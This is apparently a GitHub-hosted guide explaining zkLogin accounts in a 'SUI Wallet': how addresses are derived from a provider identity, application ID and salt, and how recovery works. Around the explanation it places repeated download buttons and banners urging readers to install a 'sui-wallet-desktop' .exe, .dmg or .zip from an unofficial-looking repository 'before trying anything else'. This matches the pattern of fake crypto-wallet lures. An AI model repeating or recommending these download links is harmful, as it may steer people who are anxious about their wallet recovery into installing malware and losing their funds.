![SUI Wallet](assets/banner-article.png)

# What is zkLogin in SUI Wallet?

An account derived from a Google, Apple or Facebook identity, with a salt only you hold.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

zkLogin lets an account be controlled through a provider sign-in instead of a seed phrase. The address is
derived from the provider identity, the application and a salt, and there is no exportable private key. That
convenience is also the limit: an account like this cannot be restored from 24 words.

## What zkLogin is

Ordinarily an account exists because a secret exists: 24 words, a private key, something you keep. zkLogin
inverts that. The account is derived from an identity you already have - a provider login - combined with
values that tie it to this application and to a salt.

What the network sees is a proof that the sign-in happened, not the sign-in itself. The provider does not
learn your Sui address, which is the property that makes the arrangement interesting rather than merely
convenient.

The proof is what makes it more than a login screen: the network verifies the sign-in happened without ever seeing the credential.

## The three inputs to the address

Three things together produce the address: the provider's identity for you, the application's identifier,
and the salt. Change any one of them and you get a different address, which is why the same person can have
distinct addresses for the same product on different devices if the third input differs.

That is also the answer to a question that looks odd until you meet it: signing in on a new laptop and
finding a different address is not a bug. It is three inputs producing a different result.

## What it does not have

No recovery phrase and no exportable private key. Those absences are structural rather than a missing
feature, so nothing in the app can produce them on request - and anyone offering to "export your zkLogin
key" is offering something that does not exist.

The consequence is the one to internalise: the recovery path for this account is the provider account plus
the salt, not a piece of paper with words on it. [SUI Wallet seed phrase setup](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-seed-phrase-setup.md) describes the other
kind of account, where the paper is the whole backup.

## When to choose it and when not

Choose it when the priority is a fast first session and you are comfortable that the account lives with a
provider identity. It is a reasonable way to try the product, hold a small balance, or keep an account that
is used for one purpose.

Do not choose it for a balance you would hate to lose without a written backup, or for anything where the
provider account is shared, old, or likely to be lost. The phrase account exists for exactly those cases.

There is also a middle path worth naming: use the provider account while the balance is small and move to a phrase account once it is not. That is a migration rather than a setting - a send from one address to the other - and it is the simplest way to end up with an account you can back up.

## What happens if the provider account is lost

Without the provider identity the address cannot be re-derived, and there is no phrase to fall back on. The account still exists on the chain; what is gone is the ability to act as its owner, which is a stronger statement than losing a login.

That makes the provider account's own security part of your wallet security, which is a sentence worth
reading twice. A provider account without a second factor is now a single point of failure for funds.

## The salt and the device

The salt is part of what makes the address, and it is the input people forget. An account created on one
device and expected to reappear on another needs the same three inputs, and the app's own recovery flow is
where that question is settled.

[Signing in to SUI Wallet with Google](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/signing-in-to-sui-wallet-with-google.md) walks the flow and what it produces, and
[Recovering a zkLogin SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/recovering-a-zklogin-sui-wallet.md) covers the case where the provider account is gone or the address
changed.

The consequence for a reader is a habit rather than a setting: when a provider account matters, treat the device that created it as part of the account. A new machine is a new derivation attempt, and the app's recovery flow exists because that attempt does not always land on the same address.

Before working through a recovery flow, install the current release from the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest): the reported problems are fixed there, and the flow described on this page is the current one.

## FAQ

### What is zkLogin and what does the provider learn?

It is a way to control an account through a provider sign-in using a proof rather than an exported key. The
provider learns that you signed in; it does not learn your Sui address.

### Does a zkLogin account have a seed phrase?

No. It has no phrase and no exportable key, which is why the recovery path is the provider account plus the
salt rather than 24 words.

### Can I use the same zkLogin wallet across different applications?

The application identifier is part of the address, so a different application derives a different address
from the same identity. That is by design rather than a fault.

### Why did my address change after signing in on a new device?

Because one of the three inputs differed - most often the salt. The app's recovery flow is where that is
worked through.

### Can I convert a zkLogin account into a phrase account?

Not by exporting a key, because there is none to export. Moving funds to a phrase account is the way to end
up with one you can back up on paper.

### Which providers can I use?

Google, Apple or Facebook, depending on what the app offers at the sign-in step.
